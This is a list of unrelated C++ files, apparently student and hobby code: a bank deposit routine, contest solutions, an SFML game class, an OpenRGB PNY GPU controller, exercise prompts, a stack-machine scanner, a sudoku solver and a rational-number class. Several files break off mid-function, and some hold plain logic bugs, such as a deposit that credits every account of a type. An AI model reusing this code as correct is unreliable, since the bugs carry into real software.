    "#include \"Transaction.h\"\n//not needed if #include \"ValidInput.h\"\n//#include <iostream> // Added for cout\n//#include <fstream> // Added for file operations\n//#include <sstream> // Added for stringstream\n//#include <iomanip> // Added for setprecision\n//\n//using namespace std; // Added for convenience\n\nvoid Transaction::deposit(const string& userName, double amount, const string& accountType) {\n    ifstream bankAccountsFile(\"BankAccounts.txt\");\n    ofstream tempFile(\"temp.txt\");\n\n    if (!bankAccountsFile || !tempFile) {\n        cout << \"Error: Unable to open file.\" << endl;\n        return;\n    }\n\n    string line;//header file?\n    bool userFound = false;//header?\n    int chsvans;//header?\n\n\n    if (accountType == \"Checking\") {\n        chsvans = 1;\n    }\n    else if (accountType == \"Saving\") {\n        chsvans = 2;\n    }\n    else\n        cout << \"Error: Pick either Checking or Saving.\" << endl;\n\n\n    // Checking option\n    switch (chsvans) {\n    case 1:\n        while (getline(bankAccountsFile, line)) {\n            string userID, Name, accNum, accountType, bal;\n            istringstream iss(line);\n            getline(iss, userID, ';');\n            getline(iss, Name, ';');\n            getline(iss, accNum, ';');\n            getline(iss, accountType, ';');\n            getline(iss, bal);\n\n            if (accountType == \"Checking\") {\n                double currentBalance = stod(bal);\n                currentBalance += amount;\n                tempFile << userID << \";\" << Name << \";\" << accNum << \";\" << accountType << \";\" << fixed\n                    << setprecision(2) << currentBalance << endl;\n                userFound = true;\n\n                ofstream outFile(\"transactions.txt\", ios::app);\n                if (outFile.is_open()) {\n                    outFile << \"Deposit by user \" << userID << \" (Account Number: \" << accNum << \" ): $\" << amount\n                        << \". Current balance is: \" << fixed << setprecision(2) << currentBalance << endl;\n                    outFile.close();\n                }\n                else {\n                    cout << \"Error: Unable to open transaction file for logging.\" << endl;\n                }\n            }\n            else {\n                tempFile << line << endl;\n            }\n        }\n\n        bankAccountsFile.close();\n        tempFile.close();\n\n        if (userFound) {\n            if (remove(\"BankAccounts.txt\") != 0) {\n                cout << \"Error: Unable to remove file.\" << endl;\n                return;\n            }\n            if (rename(\"temp.txt\", \"BankAccounts.txt\") != 0) {\n                cout << \"Error: Unable to rename file.\" << endl;\n                return;\n            }\n        }\n        else {\n            cout << \"Error: User not found.\" << endl;\n            remove(\"temp.txt\");\n        }\n        break;\n\n        // Savings option\n    case 2:\n        while (getline(bankAccountsFile, line)) {\n            string userID, Name, accNum, accountType, bal;\n            istringstream iss(line);\n            getline(iss, userID, ';');\n            getline(iss, Name, ';');\n            getline(iss, accNum, ';');\n            getline(iss, accountType, ';');\n            getline(iss, bal);\n\n            if (accountType == \"Saving\") {\n                double currentBalance = stod(bal);\n                currentBalance += amount;\n                tempFile << userID << \";\" << Name << \";\" << accNum << \";\" << accountType << \";\" << fixed\n                    << setprecision(2) << currentBalance << endl;\n                userFound = true;\n\n                ofstream outFile(\"transactions.txt\", ios::app);\n                if (outFile.is_open()) {\n                    outFile << \"Deposit by user \" << userID << \" (Account Number: \" << accNum << \" ): $\" << amount\n                        << \". Current balance is: \" << fixed << setprecision(2) << currentBalance << endl;\n                    outFile.close();\n                }\n                else {\n                    cout << \"Error: Unable to open transaction file for logging.\" << endl;\n                }\n            }\n            else {\n                tempFile << line << endl;\n            }\n        }\n        bankAccountsFile.close();\n        tempFile.close();\n\n        if (userFound) {\n            if (remove(\"BankAccounts.txt\") != 0) {\n                cout << \"Error: Unable to remove file.\" << endl;\n                return;\n            }\n            if (rename(\"temp.txt\", \"BankAccounts.txt\") != 0) {\n                cout << \"Error: Unable to rename file.\" << endl;\n                return;\n            }\n        }\n        else {\n            cout << \"Error: User not found.\" << endl;\n            remove(\"temp.txt\");\n        }\n    }\n}\n\nvoid Transaction::withdraw(const string& userName, double amount, const string& accountType) {\n    ifstream bankAccountsFile(\"BankAccounts.txt\");\n    ofstream tempFile(\"temp.txt\");\n\n    if (!bankAccountsFile || !tempFile) {\n        cout << \"Error: Unable to open file.\" << endl;\n        return;\n    }\n\n    string line;\n    bool user",
    "#include<bits/stdc++.h>\nusing namespace std;\nint main()\n{\n    ios::sync_with_stdio(false);\n    cin.tie(NULL);\n    size_t t;\n    string bin;\n    int s=0; //help variable\n    int es=0; //even sum\n    int os =0; //odd sum\n    vector<int> num; //the array\n    cin>>t;\n    while(t--)\n    {\n        //the code for each test case\n        //my idea is that note down the number of 1's then sort that \n        //and split into two sums and the larger is the answer\n        cin>>bin;\n        for(int i=0;i<bin.size();i++)\n        {\n            if(bin[i]=='0')\n            {\n                if(s!=0) num.push_back(s);\n                s=0;\n            }\n            if(bin[i]=='1')\n            {\n                s++;\n            }\n        }\n        if(s!=0) num.push_back(s); //the array is created\n        sort(num.begin(),num.end()); //sort it\n        for(int i=0; i<num.size(); i++)\n        {\n            if(i%2==0) es=es+num[i];\n            else os=os+num[i];\n        }\n        if(es>os) cout<<es<<\"\\n\";\n        else cout<<os<<\"\\n\";\n        s=0;\n        es=0;\n        os=0;\n        bin.clear();\n        num.clear(); //clearing them for next test case\n    }\n}",
    "//Clase Objeto\r\n//Lo creo Jose, Excepto los limetes de el personaje\r\nclass Objeto {\r\npublic:\r\n\r\n    sf::Sprite sprite;\r\n    sf::Texture textura;\r\n    Mecanicas* mecanicas;\r\n    bool movible;\r\n\r\n    //Constructor de objeto para poder insertar cualquier imagen, agregar mecanicas, y buleano movible se utilizara en el futuro para cuando integremos objetos estaticos\r\n    //como ladrillos\r\n    Objeto(const std::string& imagePath, Mecanicas* movimientos, bool movible) : mecanicas(movimientos), movible(movible) {\r\n        if (!textura.loadFromFile(imagePath)) {\r\n            std::cerr << \"Error cargando la textura del objeto\" << std::endl;\r\n            exit(1);\r\n        }\r\n        sprite.setTexture(textura);\r\n    }\r\n\r\n    //Funcion para ejecutar mecanicas de movimiento y gravedad a sprite\r\n    void ejecutarMovimiento(sf::RenderWindow& window) {\r\n        if (movible) {\r\n            mecanicas->movimientoBasico(sprite);\r\n            mecanicas->gravedad(sprite, window);\r\n\r\n            // Obtiene las dimensiones de la ventana, creando un objeto\r\n            sf::Vector2u windowSize = window.getSize();\r\n\r\n//La creo Jose\r\n//Clase personaje (Pepe pepinillo: Clase hija de objeto)\r\nclass Personaje : public Objeto {\r\npublic:\r\n    //Clase constructora Personaje y objeto\r\n    //Determina posicion de Pepe \r\n    //Toma como entrada el path de la imagen de pepe, las mecanicas y si el objeto es movible\r\n    Personaje(const std::string& imagePath, Mecanicas* movimientos, bool movible) : Objeto(imagePath, movimientos, movible) {\r\n        sprite.setPosition(5.f, 600.f);\r\n    }\r\n};\r\n",
    "/*-----------------------------------------*\\\n|  RGBController_PNYLovelaceGPU.cpp         |\n|                                           |\n|  Generic RGB Interface for OpenRGB PNY    |\n|  GPU (Lovelace) Driver                    |\n|                                           |\n|  yufan   10/1/2023                        |\n\\*-----------------------------------------*/\n\n#include \"RGBController_PNYLovelaceGPU.h\"\n\n/**------------------------------------------------------------------*\\\n    @name PNY GPU 40xx\n    @category GPU\n    @type I2C\n    @save :x:\n    @direct :white_check_mark:\n    @effects :white_check_mark:\n    @detectors DetectPNYLovelaceGPUControllers\n    @comment\n\\*-------------------------------------------------------------------*/\n\nRGBController_PNYLovelaceGPU::RGBController_PNYLovelaceGPU(PNYLovelaceGPUController* controller_ptr)\n{\n    controller              = controller_ptr;\n\n    name                    = \"PNY GPU\";\n    vendor                  = \"PNY\";\n    description             = \"PNY RGB GPU Device\";\n    location                = controller->GetDeviceLocation();\n    type                    = DEVICE_TYPE_GPU;\n\n    mode Direct;\n    Direct.name             = \"Direct\";\n    Direct.value            = PNY_GPU_MODE_STATIC;\n    Direct.flags            = MODE_FLAG_HAS_PER_LED_COLOR;\n    Direct.color_mode       = MODE_COLORS_PER_LED;\n    modes.push_back(Direct);\n\n    mode Cycle;\n    Cycle.name              = \"Cycle\";\n    Cycle.value             = PNY_GPU_MODE_CYCLE;\n    Cycle.flags             = MODE_FLAG_HAS_SPEED | MODE_FLAG_HAS_BRIGHTNESS;\n    Cycle.speed             = 0x89;\n    Cycle.speed_min         = 0;\n    Cycle.speed_max         = 0xB2;\n    Cycle.brightness        = 0xFF;\n    Cycle.brightness_min    = 0;\n    Cycle.brightness_max    = 0xFF;\n    Cycle.color_mode        = MODE_COLORS_NONE;\n    modes.push_back(Cycle);\n\n    mode Breath;\n    Breath.name             = \"Breath\";\n    Breath.value            = PNY_GPU_MODE_BREATH;\n    Breath.flags            = MODE_FLAG_HAS_SPEED | MODE_FLAG_HAS_MODE_SPECIFIC_COLOR;\n    Breath.speed            = 0x09;\n    Breath.speed_min        = 0;\n    Breath.speed_max        = 0x19;\n    Breath.colors_min       = 1;\n    Breath.colors_max       = 1;\n    Breath.colors.resize(1);\n    Breath.color_mode       = MODE_COLORS_MODE_SPECIFIC;\n    modes.push_back(Breath);\n\n    mode Wave;\n    Wave.name               = \"Wave\";\n    Wave.value              = PNY_GPU_MODE_WAVE;\n    Wave.flags              = MODE_FLAG_HAS_SPEED | MODE_FLAG_HAS_BRIGHTNESS;\n    Wave.speed              = 0x60;\n    Wave.speed_min          = 0;\n    Wave.speed_max          = 0xBF;\n    Wave.brightness         = 0xFF;\n    Wave.brightness_min     = 0;\n    Wave.brightness_max     = 0xFF;\n    Wave.color_mode         = MODE_COLORS_NONE;\n    modes.push_back(Wave);\n\n    mode Flash;\n    Flash.name              = \"Flash\";\n    Flash.value             = PNY_GPU_MODE_FLASH;\n    Flash.flags             = MODE_FLAG_HAS_SPEED | MODE_FLAG_HAS_BRIGHTNESS | MODE_FLAG_HAS_MODE_SPECIFIC_COLOR;\n    Flash.speed             = 0x27;\n    Flash.speed_min         = 0;\n    Flash.speed_max         = 0x4D;\n    Flash.brightness        = 0xFF;\n    Flash.brightness_min    = 0;\n    Flash.brightness_max    = 0xFF;\n    Flash.colors_min        = 1;\n    Flash.colors_max        = 1;\n    Flash.colors.resize(1);\n    Flash.color_mode        = MODE_COLORS_MODE_SPECIFIC;\n    modes.push_back(Flash);\n\n    mode Off;\n    Off.name                = \"Off\";\n    Off.value               = PNY_GPU_MODE_OFF;\n    Off.flags               = 0;\n    Off.color_mode          = MODE_COLORS_NONE;\n    modes.push_back(Off);\n\n    SetupZones();\n\n    // Initialize active mode\n    active_mode = 0;\n}\n\nvoid RGBController_PNYLovelaceGPU::SetupZones()\n{\n    /*---------------------------------------------------------*\\\n    | This device only has 3 LED, so create a single zone.      |\n    \\*---------------------------------------------------------*/\n    zone* new_zone = new zone();\n\n    new_zone->name          = \"GPU Zone\";\n    new_zone->type          = ZONE_TYPE_SINGLE;\n    new_zone->leds_min      = 3;\n    new_zone->leds_max      = 3;\n    new_zone->leds_count    = 3;\n    new_zone->matrix_map    = NULL;\n\n    led*  new_led  = new led();\n    new_led->name           = \"Fan LED\";\n    leds.push_back(*new_led);\n\n    new_led  = new led();\n    new_led->name           = \"Right LED\";\n    leds.push_back(*new_led);\n\n    new_led  = new led();\n    new_led->name           = \"Left LED\";\n    leds.push_back(*new_led);\n\n    zones.push_back(*new_zone);\n    SetupColors();\n}\n\nvoid RGBController_PNYLovelaceGPU::ResizeZone(int /*zone*/, int /*new_size*/)\n{\n    /*---------------------------------------------------------*\\\n    | This device does not support resizing zones               |\n    \\*---------------------------------------------------------*/\n}\n\nvoid RGBController_PNYLovelaceGPU::DeviceUpdateLEDs()\n{\n    DeviceUpdateMode();\n}\n\nvoid RGBController_PNYLovelaceGPU::UpdateZoneLEDs(int /*zone*/)\n{\n    Device",
    "/*1 - O fatorial de um n\u00famero inteiro n\u00e3o negativo n \u00e9 escrito como n! (pronunciado \u201cn fatorial\u201d) e \u00e9\ndefinido do seguinte modo: para valores , para\n. Por exemplo, , que \u00e9 120. Os fatoriais aumentam de tamanho\nmuito rapidamente. Qual \u00e9 o maior fatorial que seu programa pode calcular antes de gerar um\nestouro de mem\u00f3ria?\nA) Escreva um programa que leia um n\u00famero inteiro n\u00e3o negativo e calcule e imprima seu\nfatorial.b\nB) Escreva um programa que calcule o valor da constante matem\u00e1tica usando a seguinte\nf\u00f3rmula (Nota: Seu c\u00f3digo pode parar ap\u00f3s somar 10 termos.)\nC) Escreva um programa que calcule o valor da constante matem\u00e1tica usando a seguinte f\u00f3rmula\n(Nota: Seu c\u00f3digo pode parar ap\u00f3s somar 10 termos.)*/\n\n\n/*2 - Escreva um programa que imprima os seguintes padr\u00f5es separadamente, um abaixo do outro,\ncada padr\u00e3o separado do pr\u00f3ximo por uma linha em branco. Use la\u00e7os for para gerar os padr\u00f5es.\nTodos os asteriscos (*) devem ser impressos por uma \u00fanica declara\u00e7\u00e3o na forma: cout << \u2018*\u2019 ;\no que faz com que os asteriscos imprimam lado a lado, uma declara\u00e7\u00e3o no formato cout << '\\n';\npode ser usado para passar para a pr\u00f3xima linha. Uma instru\u00e7\u00e3o no formato cout << ' '; pode ser\nusado para exibir um espa\u00e7o para os dois \u00faltimos padr\u00f5es. (Dica: os dois \u00faltimos padr\u00f5es exigem\nque cada linha comece com um n\u00famero apropriado de espa\u00e7os em branco.) Cr\u00e9dito extra: combine\nseu c\u00f3digo dos quatro problemas separados em um \u00fanico programa que imprime todos os quatro\npadr\u00f5es lado a lado, fazendo um uso inteligente dos la\u00e7os aninhados for. Para todas as partes deste\nexerc\u00edcio - minimize o n\u00famero de asteriscos e espa\u00e7os e o n\u00famero de instru\u00e7\u00f5es que imprimem\nesses caracteres.*/\n\n\n/*3 - (Triplos de pit\u00e1goras) Um tri\u00e2ngulo ret\u00e2ngulo pode ter lados que s\u00e3o todos inteiros. O conjunto\nde tr\u00eas valores inteiros para os lados de um tri\u00e2ngulo ret\u00e2ngulo \u00e9 chamado de triplo de pit\u00e1goras.\nEsses tr\u00eas lados devem satisfazer a rela\u00e7\u00e3o de que a soma dos quadrados de dois dos lados \u00e9 igual\nao quadrado da hipotenusa. Encontre todos os triplos pitag\u00f3ricos para lado1, lado2 e hipotenusa,\ntodos com tamanho n\u00e3o superior a 20. Use um la\u00e7o for triplamente aninhado que tente todas as\npossibilidades. Este \u00e9 um exemplo de computa\u00e7\u00e3o de \"for\u00e7a bruta\". Voc\u00ea aprender\u00e1 em cursos de\nci\u00eancia da computa\u00e7\u00e3o mais avan\u00e7ados que existem muitos problemas interessantes para os quais\nn\u00e3o existe uma abordagem algor\u00edtmica conhecida al\u00e9m da pura for\u00e7a bruta. */\n\n\n/*4 - (C\u00e1lculo de vendas) Um varejista on-line vende cinco produtos cujos pre\u00e7os de varejo s\u00e3o os\nseguintes: Produto 1, R$ 2,98; produto 2, R$ 4,50; produto 3, R$ 9,98; produto 4, R$ 4,49 e produto\n5, R$ 6,87. Escreva um aplicativo que leia uma s\u00e9rie de pares de n\u00fameros da seguinte forma:\nA. n\u00famero do produto\nB. quantidade vendida\nSeu programa deve usar uma instru\u00e7\u00e3o switch para determinar o pre\u00e7o de varejo para cada produto.\nDeve calcular e exibir o valor total de varejo de todos os produtos vendidos. Use um la\u00e7o 'while'\npara determinar quando o programa deve parar e exibir os resultados finais.\nn! = n \u00d7 (n \u2212 1) \u00d7 (n \u2212 2) \u00d7 . . .1 n \u2265 1 n! = 1\nn = 0 5! = 5 \u00d7 4 \u00d7 3 \u00d7 2 \u00d7 1\ne\ne = 1 + 1\n1!\n+ 1\n2!\n+ 1\n3!\n+ . . .\nex\nex = 1 +\nx\n1!\n+\nx2\n2!\n+\nx3\n3!\n+ . . .\n*/\n\n\n/*5 - (Programa de impress\u00e3o de gr\u00e1ficos de barras) Uma aplica\u00e7\u00e3o interessante dos computadores \u00e9\nexibir gr\u00e1ficos e tabelas de barras. Escreva um aplicativo que leia cinco n\u00fameros entre 1 e 30. Para\ncada n\u00famero lido, seu programa dever\u00e1 exibir o mesmo n\u00famero de asteriscos adjacentes. Por\nexemplo, se o seu programa l\u00ea o n\u00famero 7, ele dever\u00e1 exibir ******* . Mostrar as barras de\nasteriscos depois de ler todos os cinco n\u00fameros.*/\n\n\n/*6 - Escreva um programa para jogar um jogo de adivinha\u00e7\u00e3o de n\u00fameros. O usu\u00e1rio pensa em um\nn\u00famero entre 1 e 100 e seu programa faz perguntas para descobrir qual \u00e9 o n\u00famero (por exemplo,\n\u201cO n\u00famero em que voc\u00ea est\u00e1 pensando \u00e9 menor que 50?\u201d). Seu programa deve ser capaz de\nidentificar o n\u00famero depois de fazer no m\u00e1ximo sete perguntas. Dica: Use os operadores <, <=, a\nconstru\u00e7\u00e3o if-else e a fun\u00e7\u00e3o rand caso tenha d\u00favida. */\n",
    "#include<iostream>\n#include<cstring>\n#include<vector>\n#include<set>\nusing namespace std;\nconst int N=1e5;\n\nint deg[N],res[N];\nvector<int>a[N];\nbool vis[N];\nint par[N];\n\nvoid dfs(int u){\n    vis[u]=true;\n    for(int v:a[u])\n        if(!vis[v]){\n            par[v]=u;\n            dfs(v);\n        }\n}\n\nint main(){\n    memset(vis,false,sizeof(vis));\n    memset(par,0,sizeof(par));\n    int n,i,u,v;\n    cin>>n;\n    for(i=0;i<n;i++){\n        cin>>u>>v;\n        a[u].push_back(v);\n        a[v].push_back(u);\n        deg[u]++;\n        deg[v]++;\n    }\n    dfs(0);\n    //cout<<deg[88]<<endl;\n#if 1\n    set<int>s;\n    for(i=1;i<=n;i++)\n        if(deg[i]==1)\n            s.insert(i);\n    set<int>::iterator it;\n    int x,y,j=0;\n    for(it=s.begin();it!=s.end();it++){\n        //cout<<*it<<\" \";\n        y=*it;\n        x=par[y];\n        res[j++]=x;\n        deg[x]--;\n        while(x!=0&&deg[x]==1){\n            if(x>y){\n                s.insert(x);\n                break;\n            }\n            else{\n                //y=x;\n                x=par[x];\n                res[j++]=x;\n                deg[x]--;\n            }\n        }\n    }\n    //cout<<j<<endl;\n    for(i=0;i<j-1;i++)\n        cout<<res[i]<<\" \";\n\n    return 0;\n#endif\n    \n}",
    "#include <sstream>\n#include <iostream>\n#include <stdlib.h>\n#include <cstring>\n#include <fstream>\n\n#include <list>\n#include <stack>\n\nusing namespace std;\n\nclass Token {\npublic:\n  enum Type { LABEL, ID, KEYWORD, NUM, EOL, ERR, END };\n  enum KeywordType { NOTHING, PUSH, POP, DUP, ADD, SUB, MULT, DIV, POW, GOTO, JMP_LT };\n  Type type;\n  KeywordType ktype;\n  string text;\n  Token(Type);\n  Token(Type, char c);\n  Token(Type, const string& source, int first, int last);\n};\n\nclass Scanner {\nprivate:\n  string input;\n  int first, current;\npublic:\n  Scanner(const char* in_s);\n  Scanner(const string s);\n  Token* nextToken();\n  ~Scanner();\n};\n\n\nToken::Token(Type type):type(type),ktype(NOTHING) { text = \"\"; }\n\nToken::Token(Type type, char c):type(type),ktype(NOTHING) { text = c; }\n\nToken::Token(Type type, const string& source, int first, int last):type(type),ktype(NOTHING) {\n  text = source.substr(first,last);\n}\n\n\nstd::ostream& operator << ( std::ostream& outs, const Token & tok )\n{\n  if (tok.text.empty())\n    return outs << tok.type;\n  else\n    return outs << tok.type << \"(\" << tok.text << \")\";\n}\n\nstd::ostream& operator << ( std::ostream& outs, const Token* tok ) {\n  return outs << *tok;\n}\n\nScanner::Scanner(const char* s):input(s),first(0), current(0) { }\nScanner::Scanner(const string s):input(s),first(0), current(0) { }\n\nToken* Scanner::nextToken() {\n  Token* token;\n  // consume whitespaces\n  while (input[current]==' ') current++;\n  if (input[current] == '\\0') return new Token(Token::END);\n  char c  = input[current];\n  first = current;\n  if (isdigit(c)) {\n    current++;\n    while (isdigit(input[current]))\n      current++;\n    token = new Token(Token::NUM,input,first,current-first);\n  } else if (isalpha(c)) {\n    current++;\n    c  = input[current];\n    while (isdigit(c) || isalpha(c)  || c=='_') {\n      current++; c  = input[current];\n    }\n    if (input[current] == ':') {\n      token = new Token(Token::LABEL,input,first,current-first);\n      current++;\n    } else {\n      // check if it's an instruction\n      string s = input.substr(first,current-first);\n      Token::KeywordType ktype;     \n      // Token::KeywordType ktype = Scanner::checkReserved(text);\n      // NOTHING, PUSH, POP, ADD, SUB, MULT, DIV, POW, GOTO, JMP_LT };\n      if (!s.compare(\"push\")) ktype = Token::PUSH;\n      else if (!s.compare(\"pop\")) ktype = Token::POP;\n      else if (!s.compare(\"dup\")) ktype = Token::DUP;\n      else if (!s.compare(\"add\")) ktype = Token::ADD;\n      else if (!s.compare(\"sub\")) ktype = Token::SUB;\n      else if (!s.compare(\"mult\")) ktype = Token::MULT;\n      else if (!s.compare(\"div\")) ktype = Token::DIV;\n      else if (!s.compare(\"pow\")) ktype = Token::POW;\n      else if (!s.compare(\"goto\")) ktype = Token::GOTO;\n      else if (!s.compare(\"add\")) ktype = Token::JMP_LT;\n      else ktype = Token::NOTHING;\n      \n      if (ktype != Token::NOTHING) {\n\ttoken = new Token(Token::KEYWORD,input,first,current-first);\n\ttoken->ktype = ktype;\n      } else\n\t  token = new Token(Token::ID,input,first,current-first);\n    }\n  } else if ((c=='\\n') || (c=='\\r')) {\n    current++;\n    c = input[current];\n    while ((c=='\\n') || (c=='\\r')) { current++; c = input[current]; }\n    token = new Token(Token::EOL);\n  } else {\n    token = new Token(Token::ERR, c);\n    current++;\n  }\n  return token;\n}\n\nScanner::~Scanner() { }\n\n// Instructions\nclass Instruction {\npublic:\n  enum InstrType { IPUSH, IPOP, IDUP, IADD, ISUB, IMULT, IDIV, IPOW, IGOTO, IJMP_LT };\n  string label;\n  InstrType type;\n  string gotoLabel;\n  int argint; // could be label or int argument\n  Instruction(string l, InstrType itype, int arg);\n  static InstrType convertKeywordType(Token::KeywordType ktype);\n};\n\nInstruction::Instruction(string l, InstrType itype, int arg):label(l),type(itype),argint(arg) { }\n\nstatic Instruction::InstrType convertKeywordType(Token::KeywordType ktype) {\n  Instruction::InstrType itype;\n  // { NOTHING, PUSH, POP, DUP, ADD, SUB, MULT, DIV, POW, GOTO, JMP_LT };\n  switch (ktype) {\n  case(Token::PUSH): itype = Instruction::IPUSH; break;\n  case(Token::POP): itype = Instruction::IPOP; break;\n  case(Token::DUP): itype = Instruction::IDUP; break;\n  case(Token::ADD): itype = Instruction::IADD; break;\n  case(Token::SUB): itype = Instruction::ISUB; break;\n  case(Token::MULT): itype = Instruction::IMULT; break;\n  case(Token::DIV): itype = Instruction::IDIV; break;\n  default: cout << \"Error: Unknown Keyword type\" << endl; exit(0);\n  }\n  return itype;\n}\n\n\n// Parser\nclass Parser {\nprivate:\n  Scanner* scanner;\n  Token *current, *previous;\n  stack<int> stack;\n  bool match(Token::Type ttype);\n  bool check(Token::Type ttype);\n  bool advance();\n  bool isAtEnd();\n  Instruction* parseInstruction();\n  void evaluateInstruction(Instruction* instruction);\npublic:\n  Parser(Scanner* scanner);\n  void parse();\n};\n\n\n// match and consume next token\nbool Parser::match(Token::Type ttype) {\n  if (check(ttype)) {\n    advance();\n    return true;\n  }\n  return false;\n}\n\nbool Parser::check(Token::Type ttype) {\n  i",
    "#include<iostream>\r\nusing namespace std;\r\nint g[10][10];\r\n\r\nbool ok(int u, int x, int y)\r\n{\r\n\r\n\tfor (int i = 0; i < 9; i++)\r\n\t{\r\n\t\tif (g[x][i] == u || g[i][y] == u)\r\n\t\t\treturn false;\r\n\t}\r\n\tx = x / 3 * 3;\r\n\ty = y / 3 * 3;\r\n\t//\u786e\u4fdd\u4e5d\u5bab\u683c\u5185\u65e0\u76f8\u540c\u6570\u5b57 \r\n\tfor (int j = x; j < x + 3; j++)\r\n\t{\r\n\t\tfor (int k = y; k < y + 3; k++)\r\n\t\t{\r\n\t\t\tif (g[j][k] == u)return false;\r\n\t\t}\r\n\t}\r\n\treturn true;\r\n\r\n}\r\n//\u641c\u7d22\u51fd\u6570 \r\nvoid dfs(int x, int y)\r\n{\r\n\tif (x == 9 && y == 0)\r\n\t{\r\n\t\tfor (int i = 0; i < 9; i++)\r\n\t\t{\r\n\t\t\tfor (int j = 0; j < 9; j++)\r\n\t\t\t{\r\n\t\t\t\tif (j)cout << \" \";\r\n\t\t\t\tcout << g[i][j];\r\n\t\t\t}\r\n\t\t\tputs(\"\");\r\n\t\t}\r\n\t\treturn;\r\n\t}\r\n\tif (y == 9)dfs(x + 1, 0);//\u6362\u884c \r\n\telse\r\n\t{//\u5224\u65ad\u8fd9\u4e00\u884c\u4e0a\u662f\u5426\u6709\u76f8\u540c\u7684\u6570\u5b57 \r\n\t\tif (g[x][y])\r\n\t\t\tdfs(x, y + 1);\r\n\t\telse\r\n\t\t{\r\n\t\t\tfor (int i = 0; i <= 9; i++)//\u4ece\u4e00\u5230\u4e5d\u679a\u4e3e\r\n\t\t\t\tif (ok(i, x, y))\r\n\t\t\t\t{\r\n\t\t\t\t\tg[x][y] = i;\r\n\t\t\t\t\tdfs(x, y + 1);\r\n\t\t\t\t\tg[x][y] = 0;\r\n\t\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\nint main() {\r\n\r\n\tfor (int i = 0; i < 9; i++)\r\n\t\tfor (int j = 0; j < 9; j++)\r\n\t\t\tcin >> g[i][j];\r\n\tdfs(0, 0);\r\n\treturn 0;\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n",
    "//\r\n// Rational Number.cpp : This file contains the 'main' function. Program execution begins and ends there.\r\n//\r\n\r\n#include <iostream>\r\n#include <fstream>\r\nusing namespace std;\r\n\r\n\r\nclass rational {\r\n\r\npublic:\r\n    int n;\r\n    int d;\r\n    rational()\r\n    {\r\n        n =0;\r\n        d = 1;\r\n    }\r\n    void  setter()\r\n    {\r\n        cout << \"enter n:\";\r\n        cin >> n;\r\n        bool t;\r\n        do {\r\n          //  t = false;\r\n            cout << \"Enter d: \";\r\n            cin >> d;\r\n\r\n            if (d == 0)\r\n            {\r\n                t = true;\r\n                cout << \"invalid\" << endl;\r\n            }\r\n            else\r\n            {\r\n                t = false;\r\n            }\r\n        } while (t);\r\n\r\n        cout << \"enter d:\";\r\n        cin >> d;\r\n    }\r\n\r\n    friend istream& operator>>(istream& cinn, rational& num) {\r\n\r\n        cout << \"Enter Rational number numerator: \";\r\n        cinn >> num.n;\r\n\r\n        \r\n            cout << \"Enter Rational number denominator: \";\r\n            cinn >> num.d;\r\n\r\n           \r\n\r\n        return cinn;\r\n    }\r\n\r\n    friend ostream& operator<<(ostream& coutt, const rational& num) {\r\n        coutt << \"numerator:\" << num.n << endl;\r\n        coutt<<\" denominator:\" << num.d;\r\n        return coutt;\r\n    }\r\n   \r\n    rational operator+(rational &bb)\r\n    {\r\n        rational add;\r\n        add.n = (n * bb.d) + (d * bb.n);\r\n        add.d = d * bb.d;\r\n        return add;\r\n    }\r\n\r\n     void operator+=(rational& bb)\r\n    {\r\n       \r\n        n = (n * bb.d) + (d * bb.n);\r\n        d = d * bb.d;\r\n        return;\r\n    }\r\n\r\n     /*void operator++()\r\n     {\r\n\r\n         n = (n * d) + (d * bb.n);\r\n         d = d;\r\n         return;\r\n     }*/\r\n\r\n    rational operator-(rational& bb)\r\n    {\r\n        rational s;\r\n        s.n = (n * bb.d) - (d * bb.n);\r\n        s.d = d * bb.d;\r\n        return s;\r\n    }\r\n\r\n    rational operator*(rational& bb)\r\n    {\r\n        rational s;\r\n        s.n = (n *bb.n);\r\n        s.d = d * bb.d;\r\n        return s;\r\n    }\r\n\r\n    rational operator/(rational& bb)\r\n    {\r\n        rational s;\r\n        s.n = n *bb.d;\r\n        s.d = d * bb.n;\r\n        return s;\r\n    }\r\n\r\n    bool operator>(rational& bb)\r\n    {        \r\n        if ((n / d) > (bb.n / bb.d))\r\n            return true;\r\n\r\n        else\r\n            return false;\r\n    }\r\n\r\n    bool operator<(rational& bb)\r\n    {\r\n        if ((n / d) < (bb.n / bb.d))\r\n            return true;\r\n\r\n        else\r\n            return false;\r\n    }\r\n\r\n    bool operator==(rational& bb)\r\n    {\r\n        if ((n / d) == (bb.n / bb.d))\r\n            return true;\r\n\r\n        else\r\n            return false;\r\n    }\r\n\r\n  \r\n   \r\n\r\n    \r\n     \r\n\r\n    \r\n   \r\n\r\n    ~rational()\r\n    {\r\n       \r\n    }\r\n};\r\n\r\n\r\n\r\nint main()\r\n{\r\n    \r\n   \r\n            bool cc;\r\n    rational a1, a2,a;\r\n    int choice;\r\n\r\n    \r\n\r\n            bool ff;\r\n            rational num;\r\n    do\r\n    {\r\n        cout << \"============================================\" << endl;\r\n       \r\n        cout << \"1. Rational Number Setter\" << endl;\r\n        cout << \"2. Addition\" << endl;\r\n        cout << \"3. Subtraction\" << endl;\r\n        cout << \"4. Multiply\" << endl;\r\n        cout << \"5. Division\" << endl;\r\n        cout << \"6. > operator\" << endl;\r\n        cout << \"7. < operator\" << endl;\r\n        cout << \"8. check == \" << endl;\r\n        cout << \"9. stream operator\" << endl;\r\n        cout << \"0. Exit\" << endl;\r\n        cout << \"Enter Choice:\";\r\n        cin >> choice;\r\n      switch (choice)\r\n        {\r\n        case 1:\r\n            cout << \"Enter 1st Rational Num:\" << endl;\r\n            a1.setter();\r\n            cout << \"Enter 2nd Rational Num:\" << endl;\r\n            a2.setter();\r\n            a1 += a2;\r\n            cout << a1 << endl;\r\n            break;\r\n        case 2:\r\n             a = a1 + a2;\r\n             cout << a << endl;\r\n            break;\r\n\r\n        case 3:\r\n            a = a1 - a2;\r\n            cout << a << endl;\r\n            break;\r\n\r\n        case 4:\r\n            a = a1 * a2;\r\n            cout << a << endl;\r\n            break;\r\n        case 5:\r\n            a = a1 / a2;\r\n            cout << a << endl;\r\n            break;\r\n        case 6:\r\n            cc = a1 > a2;\r\n\r\n            if (cc)\r\n                cout << \"a1 is greater\" << endl;\r\n            else\r\n                cout << \"a1 is not greater\" << endl;\r\n            \r\n            break;\r\n        case 7:\r\n            ff = a1 < a2;\r\n\r\n            if (ff)\r\n                cout << \"a1 is smaller\" << endl;\r\n            else\r\n                cout << \"a1 is not smaller\" << endl;\r\n            break;\r\n        case 8:\r\n\r\n            if (a1 == a2)\r\n                cout << \"a1==a2\" << endl;\r\n            